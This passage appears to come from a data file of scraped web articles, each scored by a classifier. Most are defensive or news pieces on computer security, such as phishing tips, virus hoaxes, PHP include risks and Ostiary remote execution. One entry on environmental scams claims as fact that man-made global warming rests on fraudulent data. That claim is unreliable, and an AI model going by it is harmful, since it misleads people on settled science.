datacenter. Windows Azure Traffic Manager Imagine that you’ve built a successful Windows Azure application. Your app is used by many people in many countries around the world. This is a great thing, but as is so often the case, success brings new problems. Here, for instance, your application most likely runs in multiple Windows Azure datacenters in different parts of the world. How can you intelligently route traffic across these datacenters so that your users always get the best experience? Windows Azure Traffic Manager is designed to solve this problem. Figure 3 shows how. Figure 3: Windows Azure Traffic Manager intelligently directs requests from users across instances of an application running in different Windows Azure datacenters. In this example, your application is running in VMs spread across four datacenters: two in the US, one in Europe, and one in Asia. Suppose a user in Berlin wishes to access the application. If you’re using Traffic Manager, here’s what happens. As usual, the user’s system looks up the DNS name of the application (step 1). This query is redirected to the Windows Azure DNS system (step 2), which then looks up the Traffic Manager policy for this application. Each policy is created by the owner of a particular Windows Azure application, either through a graphical interface or a REST API. However it’s created, the policy specifies one of three options: - Performance: All requests are sent to the closest datacenter. - Failover: All requests are sent to the datacenter specified by the creator of this policy, unless that datacenter is unavailable. In this case, requests are routed to other datacenters in the priority order defined by the policy’s creator. - Round Robin: All requests are spread equally across all datacenters in which the application is running. Once it has the right policy, Traffic Manager figures out which datacenter this request should go to based on which of the three options is specified (step 3). It then returns the location of the chosen datacenter to the user (step 4), who accesses that instance of the application (step 5). For this to work, Traffic Manager must have a current picture of which instances of the application are up and running in each datacenter. To make this possible, Traffic Manager periodically pings each copy of the application via an HTTP GET, then records whether it receives a response. If an application instance stops responding, Traffic Manager will stop sending traffic to that instance until it resumes responding to pings. Not every application is big enough or global enough to need Traffic Manager. For those that do, however, this can be a quite useful service.",
        "prob": "tensor([[2.1151e-06, 1.0000e+00]])"
    },
    {
        "text": "Computer security and privacy protection is becoming more and more of a practical necessity. These days, data collection and the dangers of hacking are becoming more and more present and pervasive: nearly every website collects user data, and nearly every person with a computer should be thinking about how to protect their sensitive information. Norton Internet Security makes some of the best products for protecting privacy and ensuring the general security of your technology against viruses and other malicious threats like phishing and trojans. Norton has been making protective security software since 1990, and they offer a fairly comprehensive line of products to help their customers keep their computer systems and private information safe and secure. Privacy is becoming an increasing issue in an age where nearly everything can be done or negotiated online. There are troubling statistics about just how much personally identifiable information is floating around unprotected on the Internet. Recently, for example, researchers at Carnegie Mellon found they could accurately predict the full nine-digit social security numbers of millions of people using publicly available information on the web. With 1 and 10 consumers in the US already having fallen victim to identity theft, investing in software to help protect your sensitive and private information is a wise decision. This infographic has some useful tips about how to further protect your data, and it lays out some of the facts about how pervasive data collection is and how it works.",
        "prob": "tensor([[2.0276e-06, 1.0000e+00]])"
    },
    {
        "text": "You have probably received emails from associates warning you to be aware of a specific \"virus\"; if you did, you have most likely been the victim of a virus hoax. The DOT-COMmunications' helpdesk receives more calls about virus hoaxes than about any individual real virus. Note: some links on this page will open in a separate brower window Virus hoaxes are false reports about usually non-existent viruses, often claiming to do impossible things. Unfortunately some recipients occasionally believe a hoax to be a true virus warning and may take drastic action (such as shutting down their network) or deleting innocent files from their hard disk. Typically such hoaxes circulate by emails, which describe a dangerous new undetectable virus, usually using bogus technical terms. Hoaxes often ask you to avoid reading or downloading emails that have a particular subject line. Examples include Budweiser Frogs, It Takes Guts to Say Jesus, and Join the Crew. For instance, the Good Times hoax claims to put your computer's CPU in \"an nth-complexity infinite binary loop, which can severely damage the processor\". Good thing it doesn't exist. The hoax warns you not to read or download anything with the subject \"Good Times\" because the message is a virus. Others such as the Jdbgmgr.exe hoax rely on the presence of an existing file on people's computers to ensure that the hoax is perpetuated. Those supposedly infected are advised to send emails to everyone in their address book warning them that its likely that you have been infected by a virus that is not detected by Anti-virus systems. This virus supposedly sits quietly on your computer for 14 days before damaging the system. It is sent automatically by 'messenger' and by address book, whether or not you've sent e-mail to your contacts and advises you to search for a file with the name jdbgmgr.exe and which has a teddy bear icon. It advises you to delete the file and then urges you to warn as many people on their address book as possible that they may have been infected through your address book. You are not helping people. The continued re-forwarding of these hoaxes simply wastes time and email bandwidth and could result in your email address being blocked as spam by others. It is also possible that you may receive a hoax via email with a file attached or advising you to download a special program. Obviously, such files should be treated with caution, as they may be viruses, spyware or Trojan programs. In the case of hoaxes such as the Jdbgmgr.exe, the hoax encourages you to delete a legitimate Windows file from your computer. Jdbgmgr.exe is in fact the Microsoft Debugger Registrar for Java. The Jdbgmgr.exe file may be installed when you install Windows and does not do any harm to your system but its presence on your hard disk seeming confirms the \"truth\" of the warning and results in widespread hoax warnings. DOT-COMmunications' recommends deleting all virus hoax emails immediately, whether they contain file attachments or not and making sure you have a good anti-virus program installed, constantly updated and ran regularly. Although no official research has been done on the subject, it is estimated that hoaxes can cost you even more than a genuine virus incident. After all, no anti-virus program will detect hoaxes because they aren't really viruses and no amount of updates or new programs will detect something that doesn't exist. Some people panic when they receive a hoax virus warning - making the situation much worse. The amount of email that a typical hoax can generate is also a cost to organisations. Once a few people in your organisation have received a warning and mailed it to all their friends and colleagues, a mail overload can easily result. Your organisation may like to consider circulating a policy on virus hoaxes to your staff and volunteers, in an attempt to reduce the costs involved. Here is an example policy you could use: \"You shall not forward any virus warnings of any kind to *anyone* inside or outside the organisation other than <insert name of the department or staff member who looks after anti-virus issues or alternatively forward it to viruses@DOT-COMmunications.co.uk>. It doesn't matter if the virus warnings have apparently come from an anti-virus vendor or been confirmed by any large computer company or your best friend. *All* virus warnings should be sent to <insert name>, and <insert name> alone. It is <insert name>'s job to send round all virus warnings, and a virus warning which comes from any other source should be ignored.\" Keep yourself informed - you can ensure you have useful, up-to-the-minute data on the latest, \"hottest\" hoaxes with very little effort by visiting our latest virus information page.",
        "prob": "tensor([[0.0479, 0.9521]])"
    },
    {
        "text": "Posted December 5, 2012 Atlanta, GA Study finds security indicators sacrificed to accommodate small screens ATLANTA – Dec. 5, 2012 – How unsafe are mobile browsers? Unsafe enough that even cyber-security experts are unable to detect when their smartphone browsers have landed on potentially dangerous websites, according to a recent Georgia Tech study. Like their counterparts for desktop platforms, mobile browsers incorporate a range of security and cryptographic tools to provide a secure Web-browsing experience. However in one critical area that informs user decisions—the incorporation of tiny graphical indicators in a browser’s URL field—all of the leading mobile browsers fail to meet security guidelines recommended by the World Wide Web Consortium (W3C) for browser safety, leaving even expert users with no way to determine if the websites they visit are real or imposter sites phishing for personal data. “We found vulnerabilities in all 10 of the mobile browsers we tested, which together account for more than 90 percent of the mobile browsers in use today in the United States,” said Patrick Traynor, assistant professor in Georgia Tech’s School of Computer Science. “The basic question we asked was, ‘Does this browser provide enough information for even an information-security expert to determine security standing?’ With all 10 of the leading browsers on the market today, the answer was no.” The graphic icons at issue are called either SSL (“secure sockets layer”) or TLS (“transport layer security”) indicators, and they serve to alert users (a) when their connection to the destination website is secure and (b) that the website they see is actually the site they intended to visit. The tiny “lock” icon that typically appears in a desktop browser window when users are providing payment information in an online transaction is one example of an SSL indicator. Another is the “https” keyword that appears in the beginning of a desktop browser’s URL field. The W3C has issued specific recommendations for how SSL indicators should be built into a browser’s user interface, and for the most part, Traynor said, desktop browsers do a good job of following those recommendations. In mobile browsers, however, the guidelines are followed inconsistently at best and often not at all. The principal reason for this, Traynor admits, is the much smaller screen size with which designers of mobile browsers have to work. Often there simply isn’t room to incorporate SSL indicators in same way as with desktop browsers. However, given that mobile devices are widely predicted to face more frequent attacks from cyber-criminals, the vulnerability is almost sure to lead to increased cyber-crime unless it is addressed. “Research has shown that mobile browser users are three times more likely to access phishing sites than users of desktop browsers,” said Chaitrali Amrutkar, a Ph.D. student in the School of Computer Science and principal author of the paper that described the SSL research. “Is that all due to the lack of these SSL indicators? Probably not, but giving these tools a consistent and complete presence in mobile browsers would definitely help.” The paper, “Measuring SSL Indicators on Mobile Browsers: Extended Life, or End of the Road,” earned Amrutkar a Best Student Paper award at this year’s Information Security Conference, held Sept. 19-21 in Passau, Germany. Traynor and Amrutkar said the study, essentially a measurement analysis of the current state of visual security indicators in mobile browsers, is a necessary first step in developing a uniform set of security recommendations that can apply to mobile browsers. “We understand the dilemma facing designers of mobile browsers, and it looks like all of them tried to do the best they could in balancing everything that has to fit within those small screens,” Traynor said. “But the fact is that all of them ended up doing something just a little different—and all inferior to desktop browsers. With a little coordination, we can do a better job and make mobile browsing a safer experience for all users.” Assistant Director of Communications College of Computing at Georgia Tech",
        "prob": "tensor([[2.0537e-06, 1.0000e+00]])"
    },
    {
        "text": "Trust & security You should always assume: - If somebody can login to a Unix/Linux host as a user, they can get root on that host. - If somebody can get root on a host, they can see anything that you type on that host (via keyboard or tty sniffing), even if you use an encrypted network connection. For that reason, there are a few ways to look \"trust\" & system security: - Host A can be said to trust host B if someone from host B can login (especially if they login as root) to host A. - A user can be said to trust a host if the user types confidential information, such as important passwords, at that host. If you are a system administrator, you need to take extra care to protect passwords that can be used to login to, or become root on, large numbers of hosts. For that reason, such passwords should only be typed on hosts that you have reason to believe are secure (such hosts are sometimes referred to as \"trusted hosts\" within SCS). A general rule of thumb is that trusted hosts only have accounts for people that you trust to be careful and take reasonable security precautions with their own passwords. One way to avoid typing passwords at hosts that you administer to use your Kerberos root instance to allow Kerberized telnet & SSH autologins to remote hosts. See section on security in the local Unix administrators guide for details. If you need local console access to such hosts, one method is to set a temporary local root password that is unique to that host. The following off-site links will open in a new browser window: - Trust & SATAN - A discussion of \"trust\" from a host-centered perspective.",
        "prob": "tensor([[6.6071e-05, 9.9993e-01]])"
    },
    {
        "text": "May 25, 2011 Challenge announced for creating new, small unmanned flying machine Small unmanned aerial vehicles (UAVs) play a critical role in modern military operations. The next generation of these aerial robotic systems needs to have enhanced takeoff and landing capabilities, better endurance, require less support equipment and be adaptable to mission needs in varying conditions. The Defense Advanced Research Projects Agency (DARPA) and Space and Naval Warfare Systems Center Atlantic (SSC Atlantic) call on innovators of every kind; scientists, engineers, citizen scientists and dreamers to collaborate on the UAVForge Challenge and win $100,000 USD. The UAVForge challenge uses crowdsourcing to build small UAVs through an exchange of ideas and design practices. The goal is to build and test a user-intuitive, backpack-portable UAV that can quietly fly in and out of critical environments to conduct sustained surveillance for up to three hours. According to Jim McCormick, DARPA program manager, “The UAVForge crowd-sourced approach seeks to capture and mature novel ideas and systems integration methods from communities outside the traditional DoD acquisition process.” Self-selected teams will participate in a series of peer-reviewed milestones where participant rating will identify the top ten teams that advance to the UAVForge Fly-Off Competition. During the competition, vehicles will be tested in a simulated high-stress surveillance mission. “This is a fascinating challenge and the solution space is wide open,” explained McCormick. “We’re excited to see what innovative ideas emerge, so we’re trying to give individuals and teams lots of time to develop their concepts prior to the initial design submission date planned for late this fall.” The winning team will be awarded $100,000 and the opportunity to showcase its design in an overseas military exercise. Additionally, the winning team will work with a government-selected UAV manufacturer to produce a limited quantity of systems for future warfighter experimentation. Watch ideas take flight and learn more by visiting www.UAVForge.net. # # # Media with inquiries, contact DARPA Public Affairs, DARPAPublicAffairsOffice@darpa.mil Please direct all media queries to Outreach@DARPA.mil",
        "prob": "tensor([[0.0076, 0.9924]])"
    },
    {
        "text": "The natural level of discomfort that results from the thought of global warming is reinforced by numerous reports claiming inevitable environmental doom. A recent article in the Nature Magazine went as far as predicting that over the next fifty years, well over one million species will cease to exist due to global warming. Impact of the Information Technology Coupled with the fear prompted by environmental experts and know-it-alls is a plethora of scams. Some attempt to persuade our beliefs, while others operate with the intentions of fraud. Far from being verified is one claim that global warming is a man-made predicament. Instead of drawing these conclusions from observable facts, these assumptions are based on methods of computer modeling that generate artificial, manipulable graphic-based visions of the earth. A computer can only process the information fed to it, which in this case is usually fraudulent data intended to stir up controversy. Other types of environmental fraud target those who carry enough concern about the planet to make a difference. These scams typically find their way to you via email, online survey or fraudulent website. Often, criminals will make an attempt to persuade you into contributing to the prevention of global warming, preservation of the rain forest or other environmental issues. These frauds are experienced and rather savvy, able to produce content that makes them appear legitimate. Some of them will even steal logos and other identifying materials to masquerade themselves as reputable environmental organizations. To further complicate matters, you typically will have no way of knowing where your contribution actually went. In a worst case scenario, a scam artist uses your personal information to commit identity theft and runs up hundreds to thousands in debt. In the End It just may be safe to assume that environmental problems such as global warming has everything to do with politics and little to do with science. Scientists who endorse these theories command and often receive robust government grants to conduct their research. Without the prevalence of imminent threats, scientists wouldn’t get funded, essentially making these environmental issues a big business. Right behind these scientist is a group of criminals determined to play on your fear and genuine concern to turn a profit. In the end, it is at your discretion whether or not you choose to believe or financially support these highly publicized environmental issues. At the same time, you must keep in mind that many of these theories are not supported by verifiable documentation while remaining aware of the numerous scams lurking in the background. You can do your part at preserving the environment by viewing the tips on the following website:www.environmental-expert.com",
        "prob": "tensor([[0.0079, 0.9921]])"
    },
    {
        "text": "Important Aspects Of Cloud Computing Important Aspects Of Cloud Computing Cloud computing offers an answer to universities, research laboratories, the military, and the govt. agencies which utilize supercomputers to do complex jobs like securing the nation, seeking solutions to medical dilemmas, and analyzing the consequences of climate change. It’s able to making billions and trillions of computations per second. Through cloud computing, users may be able to perform tasks like analysis of sales data, storing medical information of patients, and estimating business venture risks. Generally, cloud computing includes infrastructure-as-a-service, software-as-a-service, and platform-as-a-service. For an ordinary business, the computing costs are an analogous and the company often absorbs any upfront costs associated with cloud computing. The infrastructure of cloud computing is commonly located off-site and accessible during the internet. It is also provided by a third-part and users should not have to have technological expertise. Lack of control and access in addition to potential security risks are common issues raised against cloud computing. Users, however, experience device and site independence they usually can access different applications through an internet browser using different devices. Often, cloud computing is confused with autonomic computing, grid computing, and utility computing although various providers do rely upon grids. It does share some traits with autonomic computing and feature an identical billing methods like those utilized by utilities. These days, these same providers have expanded and people systems available now now not have centralized billing infrastructures or systems . Large business organizations are actually tapping the largest cloud computing services providers for his or her needs. Cloud computing was in a position to raise awareness towards resource optimization. Business executives are actually looking into savings they’ll generate from support personnel, software licenses, power, and space in the event that they get to the cloud. Initial steps are being undertaken by businesses, which not yet able to bring their computing requirements to the cloud, to pool and consolidated data and computing resources in addition to software efficiency. On-demand, scaling, and automation features often lessen delivery lead-time for services and software to only a couple of minutes which ends to controlled steady-state expenses, diminished time-to-value, and captured runaway demand. Cloud computing is ready to push these business organizations to adopt technological strategies and investment practices in addition to operating models which will balance operating cash flows, capital outlays, control, time, and opportunity. Cloud computing operating practices and technologies turn support and delivery right into a commodity. It offers a substitute for business executives. Those providers of data technology need to step up their profiles and offerings in order that they get nearest to their suppliers and customers, and business innovation by providing a brand new and higher capability delivery. They should adopt architectural practices, management, and technology strategies so they provide services and products which are easily bundled. Cloud computing is usually capable of show its effectiveness as regards to software design discipline. It’s totally dependent upon the deployment readiness, quality, and design of its software to ensure that it to supply cost containment, performance, resource optimization, and scalability. Lastly, cloud computing also paves the best way for the emergence of platforms. Which includes mobility and Web 2.0, it has altered the advance experience from working with data storage, middleware protocols, and O/S services to application programming interface and development toolkits. Developers can reap the benefits of cloud computing presentation, assembly, data, and infrastructure services then add their very own configurations and/or codes to lead to new personal, consumer, or business capabilities. By Florence G. de Borja",
        "prob": "tensor([[2.1060e-06, 1.0000e+00]])"
    },
    {
        "text": "How to Spot Fraudulant Emails Every internet user should know about Internet fraud known as \"phishing\" or \"spoofing.\" Phishing is a technique used to trick you into revealing your personal information such as bank and credit card account numbers, passwords, your birth date and your social security number. The scam is very simple. You receive an e-mail that appears to be from a company with whom you do business. It will tell you that your account information is out of date or needs to be re-verified, and it will include a link that will take you to a fake copy of the company's website. There, you'll be asked for your personal information which is then deposited into the hands of the criminals, which they can use to steal your money and your identity. - There may be obvious spelling or grammatical mistakes in the text of the e-mail. - The e-mail may convey a sense of urgency. For example, it might claim that you might be assessed a fee or that your account will be closed or suspended, if you do not respond quickly. - There are embedded links that appear to be legitimate because they contain the company's name. These links will take you to fake websites or pop-up windows that will ask you to provide your sensitive personal information. Do not be fooled! The Community State Bank or other companies will never ask you for your personal information via e-mail. How to Protect Your Accounts - Never click on links found in unsolicited e-mails, especially if they ask for your personal information. Even if you don't enter any personal information, some of these links can install spyware or viruses on your computer that can record your account information. - Bookmark the websites of companies with whom you frequently do business, or type the URL by hand into your browser instead of clicking on links in emails. - Change your passwords regularly. - Make sure that you regularly install security updates on your computer. Many companies, including Microsoft and Netscape, offer these updates for free. - The Community State Bank will never telephone or e-mail you and ask you to provide your personal account information. Although you may be asked to verify your identity if you call us, we will never contact you requesting this information. - Never send personal information such as account numbers, passwords, your social security number or other confidential information in e-mail.",
        "prob": "tensor([[2.0681e-06, 1.0000e+00]])"
    },
    {
        "text": "If you use Internet Explorer, it is vital that you read this announcement and act upon its contents. If not, it's still in your best interest to read on. Some weeks ago, a flaw was found in Microsoft's JPEG parser. Now, it appears somebody has created a JPEG virus that can actually infect your computer. What does this mean? In the past, opening images was completely harmless from a security point of view, or at least it seemed to be. Not anymore. IE users with unpatched systems can be infected by simply looking at a malicious JPEG image. So what does MC have to do with this? Members of MC can put images inside their posts or signature or link to them, even upload them. Avatars are also pictures. We can't deny the possibility that somebody would put up a malicious image, although we hope and believe that none of our users would ever do so. One solution would be to turn off those features, but that would hardly be acceptable. However, this does prompt us to issue a very severe warning: If you haven't done so already, update your computer! Windows Update will both update GDI+ and run a small program that determines what other programs on your computer need patching. Install the update, run the program, patch your other programs if necessary and then, if you use Microsoft Office, go to Office Update and install all available patches. Once you've completed these steps, you should be safe. However: MYSTcommunity and its staff are in no way responsible for the content posted by its members, including malicious images and other malware. And one more thing, which should speak for itself but is nonetheless very important: Any user found posting such malicious images on MC, linking to them, or referencing them in any other way will automatically be banned. No exceptions, no excuses. Page 1 of 1 Warning about malicious JPEG images Very important information Share this topic: Page 1 of 1",
        "prob": "tensor([[2.6339e-06, 1.0000e+00]])"
    },
    {
        "text": "Apples iCloud service lets users sync a staggering amount of data between Macs, Windows PCs, iPhones, and iPads. Though Apple says it stores this data securely in an encrypted format, just how safe is it? An Ars reader wrote in to ask us this question, so we decided to investigate.The simple answer is that your data is at least as safe as it is when stored on any remote server, if not more so. All data is transferred to computers and mobile devices using secure sockets layer via WebDAV, IMAP, or HTTP. All data except e-mail and notes—more on that later—are stored and encrypted on disk on Apples servers. And secure authentication tokens are created on mobile devices to retrieve information without constantly transmitting a password.",
        "prob": "tensor([[0.0020, 0.9980]])"
    },
    {
        "text": "PHP Security and YOU - Including files the right way As a web host we fight the battle against hackers and bad code on a daily basis. So HostNexus is looking to encourage clients to use file inclusion within PHP in a more security conscious and safe manner. Including files with PHP is a common practice and most usage comes in 2 forms. These are including internal files from your own domain and including files from remote (external) sources. This looks something like: Both are valid syntax in the PHP world but there are two main problems we see on the servers. Sometimes when you include a file using the the URL of your local domain you can cause a PHP loop that initiates endless HTTP requests which causes server load issues and even a server crash due to the load. If you want to include files from your local domain you just need to use the server path instead: And now onto using include() for calling external files: The main problem with include() is that runs everything through the PHP parser and evaluates code. The main problem comes from setting a variable for include() which can be easily exploited. Here is an example of code in an index.php: echo \" <body>\\n\"; echo \" </body>\\n\"; The $go variable above is easily exploited like: The hacker can now execute commands on your files, installing phishing sites, sending spam and stealing data. If you want to include files from remote domains use PHP's readfile() function instead: While not 100% secure it still provides more protection as readfile() simply outputs data to a browser rather than parsing everything as PHP. I emailed about this issue in a recent NewsFlash and the blog post has been up for quite some time. We will be setting allow_url_include to off on all servers from August 1st so please check your code if you use includes and make the easy changes. Tha's All Folks! See you all next time. - Laurence, Head Coffee Maker, HostNexus",
        "prob": "tensor([[2.0592e-06, 1.0000e+00]])"
    },
    {
        "text": "WASHINGTON – The U.S. Department of Homeland Security’s (DHS) Stop.Think.Connect.™ campaign has announced a new partnership with the Girl Scouts of the USA to help raise awareness among more than 3.2 million youth across the country about the importance of cybersecurity and online safety. “Today, we are more connected to the Internet than ever before, but increased interconnectivity increases the risk of theft, fraud and abuse,” said Secretary of Homeland Security Janet Napolitano. “We are proud to partner with Girl Scouts of the USA to help women and girls protect themselves online and do their part to ensure that cyberspace is a safe and secure environment for all Internet users.” “This collaboration between Girl Scouts and the U.S. Department of Homeland Security will empower girls to become leaders and advocates for the safe and responsible use of technology,” explains Anna Maria Chávez, Chief Executive Officer of the Girl Scouts of the USA. “We know that girls are online. As adults, it is our responsibility to create an environment that encourages girls to establish healthy online habits.” The campaign will provide the Girl Scouts of the USA with tools and resources to help raise awareness among kids, teens, and young adults about emerging online threats and the importance of cybersecurity. This partnership builds on the campaign’s ongoing efforts to highlight curriculum resources available to communities, and to educate America’s youth about safer online practices. Stop.Think.Connect.™ is a national public awareness effort to guide the nation to a higher level of Internet safety and security by educating and empowering the American public to be more vigilant about practicing safe online habits. The campaign encourages Americans to view Internet safety and security as a shared responsibility at home, in the workplace, and in our communities.",
        "prob": "tensor([[2.4565e-06, 1.0000e+00]])"
    },
    {
        "text": "Dec. 9, 2010 A researcher at the University of Luxembourg has demonstrated a new class of attacks against mobile phones at the security conference DeepSec in Vienna. Using a base transceiver station (available for 1000 euro) he has shown how common programming errors in the communication stack of mobile phones can be exploited to gain control of the devices. Ralf-Philipp Weinmann found devastating flaws in a large percentage of cellular communication stacks. According to him, sufficiently motivated attackers are able to attack phones in a way that is almost undetectable. Vulnerable cell phones can be taken over if they are within the range of the rogue transceiver, which may mean hundreds of phones at a time in crowded urban areas. Attackers can cause billing problems by either dialing premium numbers or sending text messages to premium services; or they can monitor the complete communications of the cell phone user. Eavesdropping on nearby cell phones is also possible by making the vulnerable cell phone pick up incoming calls automatically -- without the user noticing.The attacking transceiver needs to be online for just a couple of seconds to perform the attack. The University of Luxembourg, is working together with a number of vendors for both cellular communication chips and mobile phones. The objective is to fix the security flaws found and to prevent similar flaws from happening in the future. Other social bookmarking and sharing tools: Note: If no author is given, the source is cited instead.",
        "prob": "tensor([[0.0022, 0.9978]])"
    },
    {
        "text": "What is Tor? Tor is free software and an open network that helps you defend against a form of network surveillance that threatens personal freedom and privacy, confidential business activities and relationships, and state security known as traffic analysis Learn more about Tor » Why Anonymity Matters Tor protects you by bouncing your communications around a distributed network of relays run by volunteers all around the world: it prevents somebody watching your Internet connection from learning what sites you visit, and it prevents the sites you visit from learning your physical location. Tor works with many of your existing applications, including web browsers, instant messaging clients, remote login, and other applications based on the TCP protocol. Get involved with Tor » Our ProjectsLearn more about our projects » Who Uses Tor? People like you and your family use Tor to protect themselves, their children, and their dignity while using the Internet. Businesses use Tor to research competition, keep business strategies confidential, and facilitate internal accountability. Activists use Tor to anonymously report abuses from danger zones. Whistleblowers use Tor to safely report on corruption. Journalists and the media use Tor to protect their research and sources online. Militaries and law enforcement use Tor to protect their communications, investigations, and intelligence gathering online. Combined flashproxy and pyobfsproxy bundles now available. See the announcement for details. Tails, The Amnesic Incognito Live System, version 0.16, is now available.",
        "prob": "tensor([[4.2443e-06, 1.0000e+00]])"
    },
    {
        "text": "...making Linux just a little more fun! By Ray Ingles \"There are two ways of constructing a software design. One way is to make it so simple that there are obviously no deficiencies, and the other is to make it so complicated that there are no obvious deficiencies.\" - C.A.R. Hoare \"Sure I'm paranoid, but am I paranoid ENOUGH?\" - Unknown System administrators frequently want to be able to work on the machines they run even when they are far away from them. There are secure tools that allow full remote shell access, like ssh and lsh, but due to their complexity they have suffered critical exploits from time to time. In addition, their overhead can be excessive for some purposes. Fortunately, other options are available that can be used alone or can be combined with remote shells to create a more secure overall system. Maybe the pager has just gone off when you're home in bed, and the boss wants you to fix the broken database now. Or perhaps you're out for lunch and someone calls to tell you the mailserver has been cracked and is currently spamming the world, and you need to bring it down fast. Possibly you've checked and your Web server has wedged itself and needs to be restarted. Or suppose you're just on vacation and find you want to update your home Web site with some new photos. In all these cases, you'd like to do something to the machine over the Internet without having to actually sit in front of it - things you don't want just anybody to be able to do. Tools like ssh and lsh are great for allowing secure remote access to your system. They offer essentially full, flexible remote control of a machine, in an encrypted and authenticated manner. But they are complex pieces of software; there's no way to do what they do without being complex. And with complexity comes bugs. SSH and lsh, and related tools like Webmin, have all had serious flaws that would allow an attacker to get full control over your system. Leaving them available all the time is a risk - sometimes it's necessary, but it's still a risk. And in some cases, you'd like to be able to tell the machine to do something, but it's not even attached to the network on a regular basis. It would be nice to enable remote shell access only when necessary. And perhaps (for something like shutting down a mail server) you don't even need a full shell, just a way to fire off a script remotely. Of course, the problem then becomes, how do you know that the alternative software is any more secure than ssh itself? Various people have worked on this problem in the past, and several potential solutions are available, ranging from the simple and venerable to the new and exotic. Xringd uses a modem to control a machine remotely. Mail filters can be used to trigger actions based on special messages. Some solutions (like 'port knocking' and 'Net::Pcap') use the network, but without requiring even a single open port. Lando runs commands over a network, using username and password. Most recently, a program specifically for secure remote execution called Ostiary has been developed. The eXtended Ring Daemon, or \"Xringd\", uses a modem to monitor rings on a phone line. It counts the number of rings, and the time between them. If a 'sequence' matches one of the ones that it has been set up to detect, Xringd will run an associated command. This is very nice from a security perspective. Since it uses no network connection at all, it's entirely immune to network attacks like buffer overflows. It can be used even when a network connection is unavailable (it's often used to cause a computer to initiate a dialup connection). The only 'client' you need is a phone. If you use it to start up ssh on demand, then the attacker needs to know the right phone number and the right ring pattern - it's quite hard to sniff that kind of thing remotely. It's also highly resistant to a man in the middle attack. (If you have to worry about someone rerouting your phone calls, you're in more trouble than Xringd can save you from.) There are some practical issues that may make this unattractive in some circumstances. You need a modem and a telephone line to the server. (Fortunately, you don't need a fast modem at all; even a 1200 baud one will do nicely, but some servers are not placed close to a telephone jack.) Also, things like answering machines or voicemail (or even other people answering the telephone) can interfere with Xringd. If you give the server a dedicated line, you can avoid these problems, but that can be costly. Finally, note that the rings you hear when making a call are not necessarily synchronized with the ring signals actually sent to the telephone. In most circumstances, they are close enough, but reliability can be an issue at times. Most of the mail filtering programs have a way to invoke scripts when mail matching a pattern is received (in the simplest case, mail to a particular address). Assuming the server is running an SMTP daemon, this can be a nice way of triggering actions remotely. Technically, one could even send a shell script to be run, and have it e-mail the results back to you, giving you the equivalent of a very slow remote shell. The only client needed is an e-mail program, or even a webmail account. The first problem is that if the box you want to talk to doesn't accept e-mail, this obviously won't work. (Adding an entire mail server, with the attendant risks of bugs, spam load, etc., just for remote execution doesn't make a lot of sense.) Some machines only periodically collect e-mail from a primary server, so there can be a substantial delay between when a command is sent and when it is acted upon. Furthermore, if you don't encrypt the traffic in some way (or at least sign it with PGP), then anyone sniffing traffic between you and your server may be able to take advantage of the same channel to do mischief, or perform a man-in-the-middle-attack. (E-mail traffic is notoriously easy to falsify; hence the avalanche of spam these days.) CVTSA, or \"ClairVoyanT SysAdmin\", is a system designed specifically for running commands through e-mail. It has some support for using passwords, but does not (currently) encrypt them in transit, so a sniffer could capture them and use them again. Of course, if the only things you want to do with this type of system are emergency shutdowns and other such (hopefully rare) crisis management, then even an unencrypted channel might work. However, you'll need to change the 'magic trigger pattern' each time after you use it, or you take the risk that an attacker might capture it and 'replay' it at an inconvenient time. With port knocking, a daemon monitors firewall logs, looking for particular sequences of connection attempts to particular (closed) ports. When it sees a sequence it recognizes, it runs the associated command. This isn't terribly bandwidth efficient, but it has some nice properties. First, it's hard to tell if a server is listening for port knocks. Second (and most important), it's awfully hard to crack a closed port. (Linksys routers have had a simple version of this for a while, BTW, that they call port triggering.) However, a clever attacker with a sniffer could notice this traffic, and duplicate it for their own use. More complicated encodings could express something like a PGP signature (indeed, in theory one could create an entire network protocol based on port knocks), but things rapidly become difficult to work with. As with 'mail filtering' solutions, one can either use it sparingly in emergencies, or move to real cryptography. It's also important to realize that this system is critically dependent on the probe packets actually being delivered, and delivered in the order that they were sent. This is not guaranteed on the Internet. What's more, depending on where you're at (e.g., an Internet cafe or behind a business firewall), you might not be allowed to connect out to arbitrary ports. The more complex you make the 'knocks', the less reliable the system will be. Also, notice that at least one entire IP packet (28 bytes or so minimum) is used to transmit roughly one bit of information. In terms of network efficiency, it's almost hideous. For a simple 'open up ssh' message, it's not a consideration, but actually adding cryptographic security to this system could use up a decent chunk of the available bandwidth. Finally, this increases the CPU load for each entry in the firewall log. Depending on how detailed the logs are, and how fast and busy the network is, this can be a significant drain on resources. Another interesting approach is to use Net::Pcap or other network capturing software to look for specific packets on the network (e.g., DNS requests) and examine them for particular data (e.g., a particular address). If found, it can enable ssh temporarily, or perform other actions. One potential benefit of this approach is that a computer doesn't have to have an address on a network in order to monitor traffic on that network. You can set the card to 'promiscuous mode' and examine all the traffic on the wire. (It's very hard to hack a machine you don't even know is there.) Once the 'trigger' is spotted, the sniffer can use other means (a separate network, a serial link, even Xringd) to open up SSH on a target machine. Of course, you can also simply run the sniffer directly on the target. Again, a clever attacker with their own sniffer may be able to detect the unusual activity and correlate it. To make this system truly secure, you would need more complex encoding/encryption of the 'trigger' traffic. Additionally, the CPU load for this solution can be even worse than for 'port knocking' systems. A 'port knocking' daemon monitors firewall logs, which can have variable levels of detail. By necessity, a 'sniffer' solution must examine every packet on the network segment, which can be a substantial task for a busy gigabit line. Lando allows a user to run a preconfigured set of commands remotely, using passwords, and even allowing the user to supply arguments to them. While it currently has only a Windows client, and passwords are sent in the clear (making it suitable only for use on a trusted local network, or perhaps on a VPN), it can be very useful for, e.g. operating a local firewall box without going to the trouble of logging in. All of the above solutions have their advantages, but each has some practical issues that can make them unsuitable for particular applications. Ostiary was designed to be a secure alternative that uses minimal resources. It tackles this problem with what might be termed \"aggressive simplicity\". It does require an active connection to the network (unlike Xringd and sniffing), but allows for much better default security with very low CPU, RAM, disk, and network bandwidth requirements. An Ostiary server has one open port that it listens on. When someone connects, the server sends a random fixed length 'salt' message 16 bytes in size - the size of an MD5 hash. It then waits (with a timeout) for a reply from the client. It reads (at most) 16 bytes of reply, and closes the connection. Ostiary has a list of commands to run, with associated passwords. It runs through the list, and hashes these passwords with the 'salt' it sent to the client. If one of these hashes matches the reply from the client, the associated command is run. (One final touch is that a record is kept of connections, and clients with too many failed attempts are 'locked out', and all subsequent communication from them is ignored.) A detailed security analysis is available, but a few things about this system should be clear. With a protocol this simple, the chances for dangerous bugs are drastically reduced. Using fixed-length messages essentially eliminates the chances of a buffer overflow or other memory error. (Indeed, Ostiary does no dynamic memory 